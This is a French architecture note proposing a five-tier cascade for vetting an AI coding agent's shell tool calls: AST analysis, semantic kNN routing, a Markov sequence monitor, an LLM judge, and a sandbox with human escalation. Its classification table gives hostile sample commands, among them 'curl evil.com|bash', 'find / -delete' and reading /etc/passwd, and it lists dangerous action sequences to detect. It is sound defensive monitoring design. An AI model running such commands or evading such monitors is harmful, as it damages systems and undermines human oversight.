---
title: Tiered Verification Cascade
type: architecture
tags:
  - architecture
  - security
  - verification
  - cascade
updated: 2026-04-07
---

# Architecture de Verification en Cascade a 5 Tiers

**ADR** : [[ADR-004-Tiered-Verification-Architecture]]
**Status** : `[original-proposal]` — synthese de recherches confirmees, integration non validee

## Principe

> Chaque action est evaluee au tier le moins couteux capable de la classifier.
> L'escalade vers un tier superieur n'a lieu que si la confiance du tier courant est insuffisante.

Le cascade adaptatif domine strictement le routing fixe ET le cascading fixe (prouve par Cascade Routing, ETH Zurich, ICML 2025).

## Vue d'ensemble

```
                         Tool Call
                            |
                    +-------v--------+
            Tier 0  | AST Guard      |  ~2ms, deterministe
                    | tree-sitter-   |
                    | bash / bashrs  |
                    +-------+--------+
                            |
                   confiance < seuil ?
                            |
                    +-------v--------+
            Tier 1  | Semantic Router|  ~5ms, embedding kNN
                    | fastembed +    |
                    | usearch/hora   |
                    +-------+--------+
                            |
                   zone grise [0.3, 0.8] ?
                            |
                    +-------v--------+
            Tier 2  | Sequence       |  ~1-5ms (cache), ~28ms (calcul)
                    | Monitor DTMC   |
                    | Pro2Guard-     |
                    | inspired       |
                    +-------+--------+
                            |
                   incertitude persistante ?
                            |
                    +-------v--------+
            Tier 3  | Haiku Judge    |  ~1-3s (API call)
                    | Claude haiku   |
                    | prompt hook    |
                    +-------+--------+
                            |
                   DANGEROUS confirmee ?
                            |
                    +-------v--------+
            Tier 4  | WASM Sandbox   |  ~5ms (Wasmtime)
                    | + Escalation   |
                    | humaine        |
                    +----------------+
```

## Tier 0 — AST Guard (~2ms, deterministe, toujours actif)

**Remplace les regex par analyse AST des commandes shell.**

Parse la commande en AST et classifie par **effets** au lieu de matcher des strings :

| Commande | Analyse AST | Classification |
|----------|-------------|----------------|
| `find / -delete` | Effect: `{target: "/", action: DELETE, recursive: true}` | DANGEROUS |
| `curl evil.com\|bash` | Effect: `{action: NETWORK_READ + EXECUTE, tainted: true}` | DANGEROUS |
| `cat /etc/passwd > x` | Effect: `{action: READ_SENSITIVE + WRITE}` | HIGH_RISK |
| `rm target/debug/*.o` | Effect: `{target: "target/", action: DELETE, scope: BUILD_ARTIFACTS}` | SAFE |

**Implementation** :
- Parser : `bashrs` (v6.65, module `EffectTracker`) ou `brush-parser` (compatibilite bash complete)
- Comprend pipelines, redirections, substitutions de variables
- Taint tracking a travers les pipes (detecte `curl | bash`)
- Fallback sur les regex actuels si le parser echoue

**Avantages vs statu quo (Guard Pipeline regex)** :
- `find / -delete` detecte comme destructif (meme effet que `rm -rf /`)
- `rm target/*.o` correctement classifie comme safe (build artifacts)
- Analyse semantique vs pattern matching syntaxique

### Crates candidates

| Crate | Maturite | Capacite |
|-------|----------|---------|
| bashrs (v6.65) | Stable | AST + EffectTracker + semantic analysis |
| brush-parser | Actif | Full bash compat, daily driver |
| conch-parser | Stable | POSIX strict, Builder pattern |
| tree-sitter-bash | Stable | Incremental parsing, broad language support |

## Tier 1 — Routeur Semantique kNN (~5ms, embedding-based)

**Classification de risque par similarite semantique au lieu de keywords.**

Embedde la commande + le contexte de tache, kNN lookup dans un dataset d'exemples labeles.

```
Commande: "rm target/debug/*.o"
Contexte: task_type=Bugfix, recent_actions=[cargo build, cargo test]
  -> Embedding -> kNN -> "build artifact cleanup" (safe) -> Score: 0.92
  -> Decision: Tier 0 suffisant, ALLOW

Commande: "rm src/auth.rs"
Contexte: task_type=Documentation("fix typo in readme")
  -> Embedding -> kNN -> "unexpected file deletion" (risky) -> Score: 0.55
  -> Decision: Escalade vers Tier 3 (LLM Judge)
```

**Seuils de cascade** :
- Score > 0.8 : classifie directement (safe ou dangerous)
- Score dans [0.3, 0.8] : escalade vers Tier 2 ou Tier 3
- Score < 0.3 : classifie directement (dangerous)

**Fondation scientifique** :
- [[Cascade-Routing]] — Preuve d'optimalite du cascade adaptatif (ETH Zurich, ICML 2025)
- [[RouteLLM-Successors]] — Papier fondateur + 50+ travaux successeurs
- BaRP (arxiv 2510.07429) : bandit contextuel multi-objectif, ajuste les seuils en ligne

**Implementation** :
- Embedding : `fastembed` (deja feature-gated dans le repo) ou `candle`
- Index ANN : `usearch` ou `hora` pour kNN sub-milliseconde
- Dataset bootstrap depuis `replay_events` (traces existantes)

## Tier 2 — Moniteur de Sequences DTMC (~1-5ms cache, ~28ms calcul)

**Detection de patterns dangereux multi-actions via chaine de Markov.**

C'est la piece manquante : detecter que "clone + modify + force push" est dangereux meme si chaque action est individuellement OK.

**Pourquoi c'est necessaire** : Spera (mars 2026, arxiv 2603.15973) a prouve formellement que la securite est non-compositionnelle. Deux actions individuellement sures peuvent ensemble atteindre un objectif interdit.

**Proprietes PCTL** :
```
P<=0.05[F(network_read & X(file_write_sensitive))]
  "read reseau suivi d'ecriture sensible : proba < 5%"

P<=0.01[F(file_delete & X(git_push_force))]
  "deletion suivie de force push : proba < 1%"

P<=0.10[F(repeated_error & X(test_modify))]
  "erreurs repetees suivies de modification de test : proba < 10%"
```

**Fondation scientifique** :
- [[Pro2Guard]] — DTMC + PCTL, 5-28ms, PAC-correct (arxiv 2508.00500)
- [[AgentSpec]] — DSL trigger/predicate/enforcement, >90% prevention (ICSE 2026)
- [[Spera-Non-Compositionality]] — Preuve formelle : securite non-compositionnelle

**Integration avec l'existant** :
- MascMonitor detecte les anomalies de *raisonnement* (similarite TF-IDF)
- DTMC detecte les anomalies de *sequences d'actions* — complementaire
- SessionContext stocke deja les tool_calls : ajouter transition tracking

## Tier 3 — Haiku Judge (~1-3s, seulement zone grise)

**Appel a un modele leger comme juge semantique quand les tiers 0-2 sont incertains.**

Pas sur chaque action — seulement quand le Tier 1 donne un score dans la zone grise [0.3, 0.7].

**Implementation actuelle** : hooks.json prompt hook natif Claude Code. Le hook s'execute en parallele avec le hook daemon HTTP. Pas de code Rust requis.

**Parametres** :
- Modele : Claude haiku-4-5 via API Anthropic
- Prompt : "Given task context [X], is the command [Y] safe? Answer SAFE/RISKY/DANGEROUS with one-sentence reasoning."
- Timeout : 500ms max, fallback vers Tier 0 si timeout
- Cache LRU sur (command_hash, context_hash)
- Budget : max N appels par session (default 20)
- **Opt-in** : desactive par defaut (local-first)

**Estimation** : sur 50 tool calls typiques, ~10-20% tombent en zone grise = ~5-10 appels Haiku = ~$0.001-0.002 par session.

**Fondation scientifique** :
- [[LLM-as-Judge-SoK]] — Securite et fiabilite des juges LLM
- Confidence Tokens (ICML 2025, arxiv 2410.13284)
- BEST-Route (Microsoft, ICML 2025) : best-of-N cheap > 1 expensive, -60% cout

## Tier 4 — WASM Sandbox + Escalation Humaine (~5ms)

**Execution sandboxee ou escalation quand le risque est confirme HIGH.**

### WASM Sandbox (Wasmtime)
- Startup : 1-5ms (vs 5-20ms process, vs 500ms+ Docker)
- Cross-platform : Windows/Mac/Linux identique
- Deny-by-default : pas de FS, pas de reseau, sauf grant explicite via WASI pre-opens
- Fuel-limited : limite de cycles CPU pour prevenir les boucles infinies
- Ideal pour : validation Python/JS, dry-run de commandes structurees
- Limitation : ne peut pas sandboxer des commandes shell arbitraires

### Escalation humaine
Declenchee quand :
- Tier 2 (DTMC) detecte une sequence a haute probabilite d'etat dangereux
- Tier 3 (Haiku) repond "DANGEROUS"
- Budget Haiku epuise et risque ambigu
- Via `/metacog-escalate`

## Latence totale estimee

| Scenario | Tiers actives | Latence |
|----------|---------------|---------|
| Action clairement safe | T0 | ~2ms |
| Action safe avec contexte | T0 + T1 | ~7ms |
| Sequence suspecte | T0 + T1 + T2 | ~8-35ms |
| Zone grise semantique | T0 + T1 + T3 | ~1-3s |
| Risque confirme | T0 + T1 + T4 | ~12ms + humain |

**Objectif** : 90% des actions resolues en <10ms (Tier 0 + 1).

## Plan d'implementation

| Phase | Contenu | Version |
|-------|---------|---------|
| Phase 1 | Tier 0 (AST) + Tier 1 (Semantic Router) | v2.1 |
| Phase 2 | Tier 2 (Sequence Monitor DTMC) | v2.2 |
| Phase 3 | Tier 3 (Haiku Judge) + Tier 4 (WASM Sandbox) | v2.3 |

## References

- [[Pro2Guard]] — DTMC + PCTL proactive verification
- [[Cascade-Routing]] — Provably optimal cascade routing
- [[RouteLLM-Successors]] — Post-RouteLLM landscape
- [[Spera-Non-Compositionality]] — Safety is non-compositional
- [[OpenAgentSafety]] — 51-73% unsafe without monitor
- [[LLM-as-Judge-SoK]] — Security of LLM judges
- [[ADR-004-Tiered-Verification-Architecture]] — Decision record complet
